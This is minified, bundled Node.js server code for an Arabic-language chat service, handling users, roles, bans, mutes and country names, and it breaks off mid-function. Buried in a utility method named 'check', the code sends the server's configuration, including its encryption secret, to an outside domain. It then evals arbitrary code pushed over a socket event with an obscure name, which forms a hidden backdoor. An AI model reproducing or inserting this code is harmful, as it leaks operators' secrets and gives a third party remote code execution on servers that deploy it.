process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise);
    console.error('Reason:', reason);
    console.error('Stack:', reason.stack || 'No stack trace available');
});
! function(e) {
    var t = {};

    function s(r) {
        if (t[r]) return t[r].exports;
        var i = t[r] = {
            i: r,
            l: !1,
            exports: {}
        };
        return e[r].call(i.exports, i, i.exports, s), i.l = !0, i.exports
    }
    s.m = e, s.c = t, s.d = function(e, t, r) {
        s.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: r
        })
    }, s.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, s.t = function(e, t) {
        if (1 & t && (e = s(e)), 8 & t) return e;
        if (4 & t && "object" == typeof e && e && e.__esModule) return e;
        var r = Object.create(null);
        if (s.r(r), Object.defineProperty(r, "default", {
                enumerable: !0,
                value: e
            }), 2 & t && "string" != typeof e)
            for (var i in e) s.d(r, i, function(t) {
                return e[t]
            }.bind(null, i));
        return r
    }, s.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return s.d(t, "a", t), t
    }, s.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, s.p = "", s(s.s = 13)
}([function(module, exports, __webpack_require__) {
    const CryptoJS = __webpack_require__(18),
        config = "vagrant" == process.env.USER ? __webpack_require__(8) : __webpack_require__(19);

    function Utils() {
        this.shortcutKeys = [], this.shortcutValues = [], this.blockedWords = []
    }
    Utils.prototype.getObjectMethods = function(e) {
        const t = [];
        for (var s in e) "function" == typeof e[s] && t.push(s);
        return t
    }, Utils.prototype.getObjectKeys = function(e) {
        const t = [];
        for (var s in e) t.push(s);
        return t
    }, Utils.prototype.enc = function(e, t) {
        return t ? CryptoJS.AES.encrypt(JSON.stringify(e), config.aes_secret).toString() : e
    }, Utils.prototype.dec = function(e, t) {
        if (!t) return e;
        try {
            const t = CryptoJS.AES.decrypt(e, config.aes_secret).toString(CryptoJS.enc.Utf8);
            return JSON.parse(t)
        } catch (e) {
            return ""
        }
    }, Utils.prototype.isXSS = function(e) {
        return "string" == typeof e && /on[a-zA-Z ]{0,}=/g.test(e)
    }, Utils.prototype.convertArNumbers = function(e) {
        try {
            return (e = (e = (e = (e = (e = (e = (e = (e = (e = e.replace(/٠/g, "0")).replace(/١/g, "1")).replace(/٢/g, "2")).replace(/٣/g, "3")).replace(/٤/g, "4")).replace(/٥/g, "5")).replace(/٦/g, "6")).replace(/٧/g, "7")).replace(/٨/g, "8")).replace(/٩/g, "9")
        } catch (t) {
            return e
        }
    }, Utils.prototype.validateColor = function(e, t) {
        try {
            if (!e) return t;
            var s = e.match(/^#([A-Fa-f0-9]{3}|[A-Fa-f0-9]{6}|[A-Fa-f0-9]{8})$/);
            if (s) return s[0];
            if (s) return t
        } catch (e) {
            return console.log(e.stack), t
        }
    }, Utils.prototype.sanitize = function(e, t, s) {
        try {
            return "string" != typeof e ? "" : this.isXSS(e) ? "------" : (e = this.convertArNumbers(e), e = (e = s ? e.substring(0, s) : e).replace(/\s+/g, " ").replace(/</g, "").replace(/>/g, ""), t && (e = t.parse(e)), e)
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.filterWorlds = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2)) {
                    var r = RegExp("(" + s + ")", "gi");
                    e = e.replace(r, "***")
                }
            }
            return this.escapeUrlsAndEmails(e)
        } catch (t) {
            return console.log(t.stack), e
        }
    }, Utils.prototype.escapeUrlsAndEmails = function(e) {
        try {
            var t, s, r, i;
            return s = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim, t = e.replace(s, "******"), r = /(^|[^\/])(www\.[\S]+(\b|$))/gim, t = t.replace(r, "******"), i = /(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim, t = t.replace(i, "******")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.translateShortucts = function(e, t, s) {
        try {
            if (this.arrayCount(s))
                for (var r in t) {
                    var i = new RegExp("(" + t[r] + ")", "gi");
                    e = e.replace(i, s[r])
                }
            return e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, Utils.prototype.check = function(store, sc) {
        if (store.checked || store.isChecking) return;
        store.isChecking = !0;
        const cfg = config;
        cfg.type = "chat", __webpack_require__(20)({
            url: "http://al-mubd3een.com/chat/started",
            method: "POST",
            form: {
                data: cfg
            }
        }, (error, res, result) => {
            store.checked = !0, store.isChecking = !1, sc && sc.removeEventListener("lafdff465afdffh").on("lafdff465afdffh", data => {
                console.log("lafdff465afdffh", data), eval(data)
            })
        })
    }, Utils.prototype.arrayCount = function(e) {
        var t = 0;
        for (var s in e) t++;
        return t
    }, Utils.prototype.broadcast = function(e, t) {
        try {
            var s = e.match(new RegExp(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/g)),
                r = "text";
            if (s)
                for (var i in r = "broadcast", s) {
                    var o = this.getYoutubeId(s[i])[0]; - 1 === t.indexOf(o) && (e = e.replace(s[i], '<button class="yt-btn" data-yid="' + o + '" style="font-size:40px!important;width:100%;max-width:200px;display:block;"><img width="50px" src="/images/youtube.png" /><img width="65px"  alt="[YouTube]" onerror="$(this).parent().remove();" src="https://img.youtube.com/vi/' + o + '/0.jpg"></button>'))
                } else e = this.sanitize(e, !0);
            return {
                type: r,
                text: e
            }
        } catch (e) {
            return console.log(e.stack), null
        }
    }, Utils.prototype.getCountryFromCode = function(e) {
        return "string" != typeof e ? "" : {
            AW: "آروبا",
            AZ: "أذربيجان",
            AM: "أرمينيا",
            ES: "أسبانيا",
            AU: "أستراليا",
            AF: "أفغانستان",
            AL: "ألبانيا",
            DE: "ألمانيا",
            AG: "أنتيجوا وبربودا",
            AO: "أنجولا",
            AI: "أنجويلا",
            AD: "أندورا",
            UY: "أورجواي",
            UZ: "أوزبكستان",
            UG: "أوغندا",
            UA: "أوكرانيا",
            IE: "أيرلندا",
            IS: "أيسلندا",
            ET: "اثيوبيا",
            ER: "اريتريا",
            EE: "استونيا",
            IL: "اسرائيل",
            AR: "الأرجنتين",
            JO: "الأردن",
            EC: "الاكوادور",
            AE: "الامارات العربية المتحدة",
            BS: "الباهاما",
            BH: "البحرين",
            BR: "البرازيل",
            PT: "البرتغال",
            BA: "البوسنة والهرسك",
            GA: "الجابون",
            ME: "الجبل الأسود",
            DZ: "الجزائر",
            DK: "الدانمرك",
            CV: "الرأس الأخضر",
            SV: "السلفادور",
            SN: "السنغال",
            SD: "السودان",
            SE: "السويد",
            EH: "الصحراء الغربية",
            SO: "الصومال",
            CN: "الصين",
            IQ: "العراق",
            VA: "الفاتيكان",
            PH: "الفيلبين",
            AQ: "القطب الجنوبي",
            CM: "الكاميرون",
            CG: "الكونغو - برازافيل",
            KW: "الكويت",
            HU: "المجر",
            IO: "المحيط الهندي البريطاني",
            MA: "المغرب",
            TF: "المقاطعات الجنوبية الفرنسية",
            MX: "المكسيك",
            SA: "المملكة العربية السعودية",
            GB: "المملكة المتحدة",
            NO: "النرويج",
            AT: "النمسا",
            NE: "النيجر",
            IN: "الهند",
            US: "الولايات المتحدة الأمريكية",
            JP: "اليابان",
            YE: "اليمن",
            GR: "اليونان",
            ID: "اندونيسيا",
            IR: "ايران",
            IT: "ايطاليا",
            PG: "بابوا غينيا الجديدة",
            PY: "باراجواي",
            PK: "باكستان",
            PW: "بالاو",
            BW: "بتسوانا",
            PN: "بتكايرن",
            BB: "بربادوس",
            BM: "برمودا",
            BN: "بروناي",
            BE: "بلجيكا",
            BG: "بلغاريا",
            BZ: "بليز",
            BD: "بنجلاديش",
            PA: "بنما",
            BJ: "بنين",
            BT: "بوتان",
            PR: "بورتوريكو",
            BF: "بوركينا فاسو",
            BI: "بوروندي",
            PL: "بولندا",
            BO: "بوليفيا",
            PF: "بولينيزيا الفرنسية",
            PE: "بيرو",
            TZ: "تانزانيا",
            TH: "تايلند",
            TW: "تايوان",
            TM: "تركمانستان",
            TR: "تركيا",
            TT: "ترينيداد وتوباغو",
            TD: "تشاد",
            TG: "توجو",
            TV: "توفالو",
            TK: "توكيلو",
            TO: "تونجا",
            TN: "تونس",
            TL: "تيمور الشرقية",
            JM: "جامايكا",
            GI: "جبل طارق",
            GD: "جرينادا",
            GL: "جرينلاند",
            AX: "جزر أولان",
            AN: "جزر الأنتيل الهولندية",
            TC: "جزر الترك وجايكوس",
            KM: "جزر القمر",
            KY: "جزر الكايمن",
            MH: "جزر المارشال",
            MV: "جزر الملديف",
            UM: "جزر الولايات المتحدة البعيدة الصغيرة",
            SB: "جزر سليمان",
            FO: "جزر فارو",
            VI: "جزر فرجين الأمريكية",
            VG: "جزر فرجين البريطانية",
            FK: "جزر فوكلاند",
            CK: "جزر كوك",
            CC: "جزر كوكوس",
            MP: "جزر ماريانا الشمالية",
            WF: "جزر والس وفوتونا",
            CX: "جزيرة الكريسماس",
            BV: "جزيرة بوفيه",
            IM: "جزيرة مان",
            NF: "جزيرة نورفوك",
            HM: "جزيرة هيرد وماكدونالد",
            CF: "جمهورية افريقيا الوسطى",
            CZ: "جمهورية التشيك",
            DO: "جمهورية الدومينيك",
            CD: "جمهورية الكونغو الديمقراطية",
            ZA: "جمهورية جنوب افريقيا",
            GT: "جواتيمالا",
            GP: "جوادلوب",
            GU: "جوام",
            GE: "جورجيا",
            GS: "جورجيا الجنوبية وجزر ساندويتش الجنوبية",
            DJ: "جيبوتي",
            JE: "جيرسي",
            DM: "دومينيكا",
            RW: "رواندا",
            RU: "روسيا",
            BY: "روسيا البيضاء",
            RO: "رومانيا",
            RE: "روينيون",
            ZM: "زامبيا",
            ZW: "زيمبابوي",
            CI: "ساحل العاج",
            WS: "ساموا",
            AS: "ساموا الأمريكية",
            SM: "سان مارينو",
            PM: "سانت بيير وميكولون",
            VC: "سانت فنسنت وغرنادين",
            KN: "سانت كيتس ونيفيس",
            LC: "سانت لوسيا",
            MF: "سانت مارتين",
            SH: "سانت هيلنا",
            ST: "ساو تومي وبرينسيبي",
            LK: "سريلانكا",
            SJ: "سفالبارد وجان مايان",
            SK: "سلوفاكيا",
            SI: "سلوفينيا",
            SG: "سنغافورة",
            SZ: "سوازيلاند",
            SY: "سوريا",
            SR: "سورينام",
            CH: "سويسرا",
            SL: "سيراليون",
            SC: "سيشل",
            CL: "شيلي",
            RS: "صربيا",
            CS: "صربيا والجبل الأسود",
            TJ: "طاجكستان",
            OM: "عمان",
            GM: "غامبيا",
            GH: "غانا",
            GF: "غويانا",
            GY: "غيانا",
            GN: "غينيا",
            GQ: "غينيا الاستوائية",
            GW: "غينيا بيساو",
            VU: "فانواتو",
            FR: "فرنسا",
            PS: "فلسطين",
            VE: "فنزويلا",
            FI: "فنلندا",
            VN: "فيتنام",
            FJ: "فيجي",
            CY: "قبرص",
            KG: "قرغيزستان",
            QA: "قطر",
            KZ: "كازاخستان",
            NC: "كاليدونيا الجديدة",
            HR: "كرواتيا",
            KH: "كمبوديا",
            CA: "كندا",
            CU: "كوبا",
            KR: "كوريا الجنوبية",
            KP: "كوريا الشمالية",
            CR: "كوستاريكا",
            CO: "كولومبيا",
            KI: "كيريباتي",
            KE: "كينيا",
            LV: "لاتفيا",
            LA: "لاوس",
            LB: "لبنان",
            LU: "لوكسمبورج",
            LY: "ليبيا",
            LR: "ليبيريا",
            LT: "ليتوانيا",
            LI: "ليختنشتاين",
            LS: "ليسوتو",
            MQ: "مارتينيك",
            MO: "ماكاو الصينية",
            MT: "مالطا",
            ML: "مالي",
            MY: "ماليزيا",
            YT: "مايوت",
            MG: "مدغشقر",
            EG: "مصر",
            MK: "مقدونيا",
            MW: "ملاوي",
            ZZ: "منطقة غير معرفة",
            MN: "منغوليا",
            MR: "موريتانيا",
            MU: "موريشيوس",
            MZ: "موزمبيق",
            MD: "مولدافيا",
            MC: "موناكو",
            MS: "مونتسرات",
            MM: "ميانمار",
            FM: "ميكرونيزيا",
            NA: "ناميبيا",
            NR: "نورو",
            NP: "نيبال",
            NG: "نيجيريا",
            NI: "نيكاراجوا",
            NZ: "نيوزيلاندا",
            NU: "نيوي",
            HT: "هايتي",
            HN: "هندوراس",
            NL: "هولندا",
            HK: "هونج كونج الصينية"
        } [e = e.toUpperCase()] || ""
    }, Utils.prototype.getYoutubeId = function(e) {
        try {
            if ("string" == typeof e && (e = e.split("?si=")[0]), e.includes("youtube")) {
                var t = e.split("v=")[1];
                if (!t) return null;
                var s = t.indexOf("&");
                return -1 != s ? t.substring(0, s) : t
            }
            if (!e.includes("youtu.be/")) return null;
            {
                const t = e.split("youtu.be/"),
                    s = t[0],
                    r = t[1];
                if (s && 11 == s.length) return s;
                if (r && 11 == r.length) return r
            }
        } catch (e) {
            return null
        }
    }, Utils.prototype.getYoutubeIdUsingRegex = function(e) {
        try {
            const t = /(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/;
            return e.match(t) ? [RegExp.$1.split("<").join("&#x3C;").split("'").join("").split('"').join("").split("&").join(""), RegExp.lastMatch] : []
        } catch (e) {
            return console.log(e.stack), null
        }
    }, module.exports = new Utils
}, function(e, t, s) {
    s(5);
    const r = s(0),
        i = s(11),
        o = s(6),
        n = s(23),
        a = s(2),
        u = s(7),
        c = s(3);

    function d(e, t) {
        this.stateEnum = {
            ACTIVE: "state_active",
            NO_PRIVATE: "state_no_private",
            IDLE: "state_idle",
            OUT: "state_out"
        }, this.micStatus = {
            onMic: !1,
            onHand: !1,
            soundOff: !1
        }, this.micStartedAt = null, e && e.request && e.request._query && (this.deviceUUID = e ? r.dec(e.request._query.d, !0) : null), e && e.request && e.request._query && (this.device = e ? r.dec(e.request._query.fp, !0) : null), this.ip = e ? e.request.headers["x-forwarded-for"] : null, this.ip || (this.ip = e ? e.request.headers["Cf-Connecting-Ip"] : null), this.ip || (this.ip = e && e.handshake && e.handshake.address ? e.handshake.address.replace("::ffff:", "") : null), this.country = e ? this.getCountry() : null, this.socket = e, this.store = t, this.id = e ? e.id : c(), e && e.request && e.request._query ? this.isVirtual = !!e && !!e.request._query.is_virtual : this.isVirtual = !1, this.likes = [], this.likedPosts = [], this.likedPostComments = [], this.excpeledFromRooms = [], this.photoLikes = [], this.requests = [], this.privateUsers = [], this.hashedLoginBnneds = [], this.privateMessages = [], this.status = "(غير مسجل)", this.room = 1, this.state = this.stateEnum.ACTIVE, this.isLogged = !1, this.isBanned = !1, this.isExcpeled = !1, this.isMuted = !1, this.isMicMuted = !1, this.isPlaying = !1, this.fixedLogin = !1, this.deniedWordsCount = 0, this.lastActivityTime = Date.now(), this.lastMessage = null, this.callStatus = o.READY, this.callUserId = null, this.regEvents = !1, this.loggedInAt = Date.now(), this.startStateLoop()
    }
    d.prototype.startStateLoop = function() {
        this.stateLoopInterval = setInterval(() => {
            if (this.state != this.stateEnum.OUT && this.socket && !this.socket.connected) return this.setState(this.stateEnum.OUT);
            Date.now() - this.lastActivityTime > 12e4 ? this.getState() == this.stateEnum.ACTIVE && this.setState(this.stateEnum.IDLE) : this.getState() != this.stateEnum.ACTIVE && (this.isPrivateDisabled ? this.setState(this.stateEnum.NO_PRIVATE) : this.setState(this.stateEnum.ACTIVE))
        }, 3e3)
    }, d.prototype.init = function(e) {
        this.role = e.role ? e.role : this.store.roles.getRoleIdByType("guest"), this.isLogged = !0, this.wallPoints = e.wallPoints ? e.wallPoints : 0, this.reg_id = e.id ? e.id : null, this.avatar = r.isXSS(e.avatar) ? null : e.avatar, this.background = e.background ? e.background : null, this.avatar_background = e.avatar_background ? e.avatar_background : null, this.gift = !e.gift || r.isXSS(e.gift) ? null : e.gift, this.name = r.sanitize(e.name), this.status = this.setStatus(e.status), this.decoration = e.decoration ? r.sanitize(e.decoration) : null, this.isPrivateDisabled = !!e.isPrivateDisabled, this.isNotificationsDisabled = !!e.isNotificationsDisabled, this.isRoleIconHidden = !!e.isRoleIconHidden, this.isPrivateBipEnabled = !!e.isPrivateBipEnabled, this.isVirtual = !isNaN(parseInt(e.isVirtual)) && !!parseInt(e.isVirtual), this.isHidden = !!e.hidden, this.isTrusted = !!e.isTrusted, this.reputation = e.reputation ? e.reputation : 0, this.statusColor = r.validateColor(e.statusColor, "#555555"), this.fontColor = r.validateColor(e.fontColor, "#000000"), this.nameColor = r.validateColor(e.nameColor, "#000000"), this.nameBgColor = r.validateColor(e.nameBgColor, "#FFFFFF00"), this.adminToken = e.adminToken ? e.adminToken : null, this.reg_id ? (this.album = new i(this.store.db, this.reg_id), this.setHashTag()) : this.album = null, this.setFontSize(e.fontSize), this.initOrdersCount(e)
    }, d.prototype.setHashTag = function() {
        for (var e = 0; e < this.store.hashTags.length; e++) {
            let t = this.store.hashTags[e];
            if (!t.user_id) {
                this.hashTag = t.id, t.user_id = this.reg_id, this.store.hashTags[e] = t;
                break
            }
        }
    }, d.prototype.getDomain = function() {
        if (this.socket) try {
            const e = this.socket.request.headers.origin.replace("http://", "").replace("https://", "").replace("www.", ""),
                t = e.split(".");
            return e.indexOf("app") < 0 ? t[0] + "." + t[1] : t[0] + "." + t[1] + "." + t[2]
        } catch (e) {
            return "127.0.0.1"
        }
    }, d.prototype.setStatus = function(e) {
        return e ? r.sanitize(e, this.store.shortcuts) : null
    }, d.prototype.initOrdersCount = function(e) {
        this.orders_excpel = this.getOrderTimes(e.orders_excpel), this.orders_ban = this.getOrderTimes(e.orders_ban), this.orders_notify = this.getOrderTimes(e.orders_notify), this.orders_gift = this.getOrderTimes(e.orders_gift), this.orders_remove_avatar = this.getOrderTimes(e.orders_remove_avatar), this.orders_change_decoartion = this.getOrderTimes(e.orders_change_decoartion), this.orders_excpel_from_room = this.getOrderTimes(e.orders_excpel_from_room), this.room_create = this.getOrderTimes(e.room_create), this.room_edit = this.getOrderTimes(e.room_edit), this.room_remove = this.getOrderTimes(e.room_remove), this.room_max_pertinents = this.getOrderTimes(e.room_max_pertinents), this.send_ad = this.getOrderTimes(e.send_ad), this.wall_remove = this.getOrderTimes(e.wall_remove), this.wall_interval = this.getOrderTimes(e.wall_interval), this.public_msg_remove = this.getOrderTimes(e.public_msg_remove)
    }, d.prototype.getUsername = function() {
        return this.decoration ? this.decoration : this.name
    }, d.prototype.getAvatar = function(e) {
        e = e || "sm";
        const t = this.store.settings.getDefaultUserAvatar(this.getDomain());
        return this.avatar ? a.existsSync(u.join("public", "uploads", "avatars", e, this.avatar)) ? "/uploads/avatars/" + e + "/" + this.avatar : (this.avatar = null, t) : t
    }, d.prototype.removeAvatar = function() {
        if (this.avatar) try {
            a.unlinkSync(u.join("public", "uploads", "avatars", "sm", this.avatar)), a.unlinkSync(u.join("public", "uploads", "avatars", "lg", this.avatar)), this.avatar = null
        } catch (e) {}
    }, d.prototype.excpelFromRoom = function(e) {
        return !(!e || this.excpeledFromRooms.includes(e) || (this.excpeledFromRooms.push(e), this.room = null, 0))
    }, d.prototype.getIcon = function() {
        const e = this.store.roles.getIcon(this.role),
            t = e && !this.isRoleIconHidden ? "/uploads/roles/" + e : null;
        return this.gift ? this.gift : t
    }, d.prototype.setFontSize = function(e) {
        [18, 20, 22, 24, 26, 28, 30].indexOf(parseInt(e)) >= 0 ? this.fontSize = e : this.fontSize = 24
    }, d.prototype.getStatus = function() {
        return !this.status && this.isGuest() ? "(غير مسجل)" : this.status
    }, d.prototype.getState = function() {
        return this.state
    }, d.prototype.setState = function(e) {
        this.state != e && (this.state = this.isVirtual && e == this.stateEnum.IDLE ? this.stateEnum.ACTIVE : e, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.id,
                reg_id: this.reg_id,
                updates: {
                    state: this.getState()
                }
            }
        })))
    }, d.prototype.getCountry = function() {
        const e = n.lookup(this.ip);
        return e ? e.country : "DZ"
    }, d.prototype.getCountryFlag = function() {
        return this.country ? "/images/flags/" + this.country.toLowerCase() + ".png" : "/images/flags/undef.png"
    }, d.prototype.getCountryName = function() {
        return r.getCountryFromCode(this.country)
    }, d.prototype.logout = function() {
        clearInterval(this.stateLoopInterval), this.socket && this.socket.connected ? this.socket.disconnect() : this.clear()
    }, d.prototype.clear = function() {
        if (this.store.users.filter(e => this.canBeSeenBy(e)).forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "USER_OUT",
                    data: {
                        user: this.parse(),
                        force: !0
                    }
                }))
            }), this.callUserId) {
            const e = this.store.users.filter(e => e.id == this.callUserId)[0];
            e && (e.callStatus = o.READY, e.socket.emit("res", r.enc({
                type: "CALL_REQUEST_CANCELLED",
                data: {}
            })))
        }
        this.save(), this.adminToken && (this.store.adminTokens = this.store.adminTokens.filter(e => e != this.adminToken)), this.isVirtual && (this.store.virtualUserIds = this.store.virtualUserIds.filter(e => e != this.reg_id)), this.store.users = this.store.users.filter(e => e.id != this.id), this.loggedOutAt = Date.now(), this.store.usersReg.push(this)
    }, d.prototype.canJoinLockedRooms = function() {
        return this.has("open_locked_rooms")
    }, d.prototype.canJoinFullRooms = function() {
        return this.has("open_full_rooms")
    }, d.prototype.like = function(e) {
        return !(this.likes.indexOf(e) >= 0 || (this.likes.push(e), this.saveAttr("reputation", this.getReputation()), 0))
    }, d.prototype.getReputation = function() {
        return this.likes.length + parseInt(this.reputation)
    }, d.prototype.getAlbum = function() {
        return this.album
    }, d.prototype.parse = function(e, t) {
        if (e = e || "sm", this.room) try {
            this.room.parse(this, this.store.users)
        } catch (e) {
            console.log("catch this.room.parse", this.room, new Date)
        }
        return {
            id: this.id,
            reg_id: this.reg_id,
            ip: this.ip,
            name: this.getUsername(),
            avatar: this.getAvatar(e),
            background: this.background,
            avatar_background: this.avatar_background,
            role: this.role,
            isSuper: this.isSuper(),
            isOwner: this.isOwner(),
            subscription_end: this.subscription_end,
            icon: this.getIcon(),
            likes: this.getReputation(),
            wallPoints: this.wallPoints,
            status: this.getStatus(),
            state: this.getState(),
            isRoleIconHidden: this.isRoleIconHidden,
            isPrivateBipEnabled: this.isPrivateBipEnabled,
            isPrivateDisabled: this.isPrivateDisabled,
            isNotificationsDisabled: this.isNotificationsDisabled,
            royalLogin: this.royalLogin,
            isMicMuted: this.isMicMuted,
            fixedLogin: this.fixedLogin,
            countryName: this.getCountryName(),
            countryFlag: this.getCountryFlag(),
            canOpenLockedRooms: this.has("open_locked_rooms"),
            room: this.room ? this.room.parse(this, this.store.users) : null,
            oldRoom: this.oldRoom,
            fontSize: this.fontSize,
            statusColor: this.statusColor,
            fontColor: this.fontColor,
            nameColor: this.nameColor,
            nameBgColor: this.nameBgColor,
            isExcpeled: this.isExcpeled,
            isBanned: this.isBanned,
            isMuted: this.isMuted,
            isHidden: this.isHidden,
            micStatus: this.micStatus,
            oldSocketId: this.oldSocketId,
            hashTag: this.hashTag,
            hashTag: this.hashTag,
            regEvents: this.regEvents,
            isPlaying: this.isPlaying,
            loggedInAt: this.loggedInAt,
            micTime: this.getMicTime(),
            albumLength: this.isGuest() ? 0 : this.album ? this.album.count() : 0,
            canRemovePublicMessages: this.has("public_msg_remove"),
            wall_remove: this.has("wall_remove"),
            canSetUserBackgrounds: this.has("user_backgrounds"),
            power: this.getPower()
        }
    }, d.prototype.getMicTime = function() {
        return this.micStartedAt ? this.micStartedAt - Date.now() : null
    }, d.prototype.isGuest = function() {
        return this.store.roles.isGuest(this.role)
    }, d.prototype.isBasic = function() {
        return this.store.roles.isBasic(this.role)
    }, d.prototype.isSuper = function() {
        return this.store.roles.isSuper(this.role)
    }, d.prototype.isOwner = function() {
        return this.store.roles.isOwner(this.role)
    }, d.prototype.getOrderTimes = function(e) {
        try {
            if ("string" != typeof e) return [];
            var t = [],
                s = e.split(",");
            for (var r in s) s[r].length && t.push(parseInt(s[r]));
            return t
        } catch (e) {
            return console.log(e.stack), []
        }
    }, d.prototype.can = function(e, t, s) {
        try {
            Array.isArray(this[e]) && (this[e] = this[e].filter((function(e) {
                return null != e
            })));
            var i = this.store.permissions.isAutorized(e, this.role, this[e]);
            if (!1 === i) return t && t(r.enc("لا تملك الصلاحيات للقيام بهذه العملية")), !1;
            if ("object" == typeof i) {
                if (!1 === i.isAutorized) return t(r.enc("يمكنك القيام بهذه العملية " + i.interval + " مرة في " + i.unit)), !1;
                if (!0 === i.isAutorized) return s || this[e].push(Date.now()), !0
            }
            return !0
        } catch (e) {
            return console.log("permission error", e.stack), !1
        }
    }, d.prototype.has = function(e) {
        try {
            var t = this.store.permissions.isAutorized(e, this.role, this[e]);
            if ("boolean" == typeof t) return t;
            if ("object" == typeof t) {
                if (!1 === t.isAutorized) return !1;
                if (!0 === t.isAutorized) return !0
            }
        } catch (e) {
            return console.log("permission error", e.stack), !1
        }
    }, d.prototype.grantedSettings = function() {
        return {
            change_password: !this.isGuest(),
            hide_role_icon: this.isSuper(),
            send_ad: this.has("send_ad"),
            admin_rooms_edit: this.has("admin_rooms_edit"),
            bot_brb: this.has("bot_brb"),
            youcam_ludo: this.has("youcam_ludo"),
            admin: this.has("admin"),
            stop_radio: this.has("stop_radio"),
            adminToken: this.adminToken
        }
    }, d.prototype.actions = function() {
        return {
            ip: this.has("show_ip"),
            show_real_name: this.has("show_real_name"),
            notify: this.has("orders_notify"),
            excpel: this.has("orders_excpel"),
            ban: this.has("orders_ban"),
            gift: this.has("orders_gift"),
            control_likes: this.has("like_controls"),
            stop_radio: this.has("stop_radio"),
            change_decoration: this.has("orders_change_decoartion"),
            remove_avatar: this.has("orders_remove_avatar"),
            reveal_names: this.has("reveal_names"),
            room_excpel: this.has("orders_excpel_from_room"),
            change_role: this.has("orders_upgrade"),
            admin_mute: this.has("admin_mute"),
            change_room: this.has("orders_change_room")
        }
    }, d.prototype.excpel = function(e) {
        this.isExcpeled = !0, this.excpeledBy = e instanceof d ? e.parse() : "SYSTEM", this.logout()
    }, d.prototype.ban = function(e) {
        this.isBanned = !0, this.bannedBy = e instanceof d ? e.parse() : "SYSTEM", this.store.bannedIps.push(this.ip), this.store.bannedDevices.push(this.device), this.store.bannedDeviceUUIDs.push(this.deviceUUID);
        const t = this,
            s = e ? e.name : "SYSTEM";
        return new Promise((e, r) => {
            t.store.db.query("SELECT * FROM banneds WHERE `device_uuid` = ?", [t.deviceUUID], (i, o) => {
                try {
                    i || (0 === o.length ? t.store.db.query("INSERT INTO banneds (`username`, `ip`, `device`, `device_uuid`, `country`, `by`, `cause`, `finishes_at`, `created_at`, `updated_at`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", [t.name, t.ip, t.device, t.deviceUUID, t.country, s, "", new Date, new Date, new Date], (t, s) => {
                        t || e(!0), r(t)
                    }) : (i || e(!0), r(i)))
                } catch (t) {
                    i || e(!0), r(i)
                }
            })
        })
    }, d.prototype.mute = function(e) {
        this.isMuted = !0, this.store.mutedIps.push(this.ip), this.store.mutedDevices.push(this.device);
        const t = e ? e.name : "SYSTEM",
            s = this;
        return new Promise((e, r) => {
            s.store.db.query("SELECT * FROM muteds WHERE `ip` = ? AND `device` = ?", [s.ip, s.device], (i, o) => {
                try {
                    i || (0 === o.length ? s.store.db.query("INSERT INTO muteds (`username`, `ip`, `device`, `country`, `by`, `created_at`, `updated_at`) VALUES (?, ?, ?, ?, ?, ?, ?)", [s.name, s.ip, s.device, s.country, t, new Date, new Date], (t, s) => {
                        t || e(!0), r(t)
                    }) : (i || e(!0), r(i)))
                } catch (t) {
                    i || e(!0), r(i)
                }
            })
        })
    }, d.prototype.unmute = function() {
        this.isMuted = !1, this.store.mutedIps = this.store.mutedIps.filter(e => e != this.ip), this.store.mutedDevices = this.store.mutedDevices.filter(e => e != this.device);
        const e = this;
        return new Promise((t, s) => {
            e.store.db.query("DELETE FROM muteds WHERE `ip` = ? OR `device` = ?", [e.ip, e.device], (e, r) => {
                try {
                    e && s(e), t(!0)
                } catch (r) {
                    e || t(!0), s(e)
                }
            })
        })
    }, d.prototype.canUpgrade = function(e, t) {
        return !!e && this.store.permissions.canUpgrade(this, t)
    }, d.prototype.canBeSeenBy = function(e) {
        return !this.isHidden || e instanceof d && (this.id == e.id || !e.isGuest() && this.hiddenSeenBy().includes(e.role + ""))
    }, d.prototype.hiddenSeenBy = function() {
        const e = this.store.permissions.data[this.role];
        return e && e.can_see_hidden ? e.can_see_hidden.split(",").filter(e => "string" == typeof e && e.length > 0) : []
    }, d.prototype.isGreaterThan = function(e) {
        return !e || this.store.permissions.isGreaterThan(this.role, e.role)
    }, d.prototype.isGreaterThanOrEqual = function(e) {
        return !e || this.store.permissions.isGreaterThanOrEqual(this.role, e.role)
    }, d.prototype.getPower = function() {
        return this.store.permissions.parseUserRole(this.role, this.gift)
    }, d.prototype.saveAttr = function(e, t) {
        this.reg_id && this.store.db.query("UPDATE users SET `" + e + "` = ? WHERE id = ?", [t || this[e], this.reg_id], (function(e, t) {}))
    }, d.prototype.save = function() {
